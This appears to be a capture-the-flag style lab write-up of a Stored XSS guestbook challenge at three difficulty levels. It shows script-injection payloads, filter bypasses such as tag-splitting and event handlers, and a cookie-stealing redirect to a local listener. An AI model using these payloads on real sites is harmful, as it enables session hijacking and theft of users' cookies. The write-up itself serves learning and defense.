# Stored XSS

Stored XSS is a type of XSS vulnerability where malicious scripts are permanently stored on the target server, typically in a database, comment field, message board, etc. Whenever a user loads a page that displays this stored data, the malicious script executes in the context of their browser.

This is more dangerous than other forms of XSS because:
- It doesn’t require the attacker to trick the victim into clicking a malicious link.
- It affects every user who views the infected content.

## Stored XSS vs Reflected vs DOM-based XSS

| Type | Payload Location | Execution Trigger | Server Involvement |
|------|------------------|-------------------|--------------------|
| Stored | Stored in database or file | Page load | Yes (saves and reflects) |
| Reflected | In URL or form input | On page load after request | Yes (reflects directly) |
| DOM-based | In client-side script | Handled by Javascript | No (purely on client side) |

## Example Differences:
- Stored: Attacker posts `<script>alert('XSS')</script>` as a comment. Anyone viewing the comment sees the popup.
- Reflected: Attacker sends a link like `?name=<script>alert(1)</script>`. User clicks the link, and the script runs.
- DOM-based: Script on page takes URL hash `(#xss=<script>)` and injects it into HTML using innerHTML.

> Note: Stored XSS is stored in the database. The XSS will be permanent until the database is reset or the payload is manually deleted.

<br>

---

## Low Difficulty


In Low difficulty, the code will not check the requested input before including it to be used in the output text:

<img src="./Screenshots/Screenshot1.png" width=80% height=80%><br><br>

### Injecting Script

From user's perspective, the submitted name and message will be stored to the backend database, so each time a user visit the page, the guestbook message can be seen by others:

<img src="./Screenshots/Screenshot2.png" width=80% height=80%><br><br>

Now, we can try injecting a Javascript message:

<img src="./Screenshots/Screenshot3.png" width=80% height=80%><br><br>

What’s interesting here is if we go to other page and go back, even though there is no malicious URL, the code will be executed every time the page is loaded:

<img src="./Screenshots/Screenshot4.png" width=80% height=80%>

<img src="./Screenshots/Screenshot5.png" width=80% height=80%>

<img src="./Screenshots/Screenshot6.png" width=80% height=80%><br><br>

The only way to get rid of this is to clear the guestbook, so the script is no longer staying in the database:

<img src="./Screenshots/Screenshot7.png" width=80% height=80%>

<img src="./Screenshots/Screenshot8.png" width=80% height=80%><br><br>

### Cookie Exfiltration

Since the objective is to redirect victim to another page, we can set up our HTTP server and use the same script `<script>window.location='http://127.0.0.1:1337/?cookie=' + document.cookie</script>` from previous challenge:

<img src="./Screenshots/Screenshot9.png" width=80% height=80%><br><br>

Here we need to inspect the page element and change the max length for message box so our script can fit inside:

<img src="./Screenshots/Screenshot10.png" width=80% height=80%><br><br>

If we go to another page and went back here, the page will automatically redirect us to the specify URL and send the cookie to the server:

<img src="./Screenshots/Screenshot11.png" width=80% height=80%>

<img src="./Screenshots/Screenshot12.png" width=80% height=80%>

<img src="./Screenshots/Screenshot13.png" width=80% height=80%><br><br>

---

## Medium Difficulty

> Note: If you can’t go back to the Stored XSS challenge page, remember to set the difficulty to Impossible and clear the guestbook, then set back to Medium again.

In Medium difficulty, the code will now strip the whole `<script>` tag and add slashes to the message:

<img src="./Screenshots/Screenshot14.png" width=80% height=80%><br><br>

We can see that due to the `<script>` tag being stripped, it is no longer a valid Javascript and thus when stored in database, it will not be executed whatsoever:

<img src="./Screenshots/Screenshot15.png" width=80% height=80%>

<img src="./Screenshots/Screenshot16.png" width=80% height=80%><br><br>

### Solution

If we look into the source code again, we can see that the `name` input do have sanitization, but it just specifically to look for the match of `<script>`, unlike the `message` input sanitization where the tag has been completely stripped, which means we can use the previous method like `<SCRIPT>`, `<S  C  R  I  P  T>` or `<scr<script>ipt>` to bypass this:

<img src="./Screenshots/Screenshot17.png" width=80% height=80%><br><br>

We can then utilize this vulnerability to insert our Javascript, in this case I used `<scr<script>ipt>alert(document.cookie)</script>`. (Remember to change the max length in the inspect page element):

<img src="./Screenshots/Screenshot18.png" width=80% height=80%><br><br>

The Javascript has been successfully stored in the database and executed. We can do the same cookie exfiltration like previous low difficulty that hosting a HTTP server and redirect victim to the page that will steal the cookie and send to the server:

<img src="./Screenshots/Screenshot19.png" width=80% height=80%><br><br>

---

## High Difficulty

Just like the previous Reflected XSS challenge, now the high difficulty of Stored XSS challenge also use `preg_replace` to remove all the element that can match to `<script>`. As usual, we can use other tag like `<img src>` to bypass this, but this time let’s try to use different one since we’ve been using `<img src>` for quite a while:

<img src="./Screenshots/Screenshot20.png" width=80% height=80%><br><br>

We can use the `a` tag and `onclick` event script, can be found on the cheatsheet website as well:

<img src="./Screenshots/Screenshot21.png" width=80% height=80%><br><br>

Now we can bypass the `<script>` tag protection on name input, so it is should be stored in the database. We can see that our name has become `test` and is clickable:

<img src="./Screenshots/Screenshot22.png" width=80% height=80%><br><br>

If we click on it, the script will be executed, and each time the page is loaded, the name can be clicked:

<img src="./Screenshots/Screenshot23.png" width=80% height=80%><br><br>

We can try other event handler such as `oncopy`, `ondraggable`, `oncut` and more. Feel free to explore more on the PortSwigger XSS cheatsheet.

---

## Conclusion

Stored XSS is one of the most dangerous forms of Cross-Site Scripting because the malicious payload is permanently saved in the backend database and delivered to all users who visit the affected page. This makes it more scalable and impactful than Reflected or DOM-based XSS, as no user interaction or special link is required, just simply visiting the infected page is enough.

In this challenge, we have learned that:
- Low difficulty allowed raw JavaScript to be saved and executed directly with no sanitization, affecting all users who visited the guestbook.
- Medium difficulty attempted to filter `<script>` tags but still allowed bypasses on `name` input via case manipulation, tag splitting, and alternative encodings.
- High difficulty used regular expressions to block `<script>` but remained vulnerable to event handler-based attacks using other HTML tags like `<a onclick=...>`, proving that partial filtering is not a reliable defense.

Across all levels, once the payload was successfully stored, it was repeatedly triggered upon each page load or user interaction and this shows a powerful demonstration of how stored XSS can lead to impactful exploitation.

---

### Skills Applied:

- Understanding the difference between Stored, Reflected, and DOM-based XSS
- Identifying where user input is stored and reflected in output
- Exploiting unsanitized input fields to inject persistent JavaScript
- Bypassing basic filters using:
  - Case-insensitive tags (`<SCRIPT>`, `<S  C  R  I  P  T>`)
  - Tag-splitting (`<scr<script>ipt>`)
  - HTML event handlers (`onclick, onerror`)
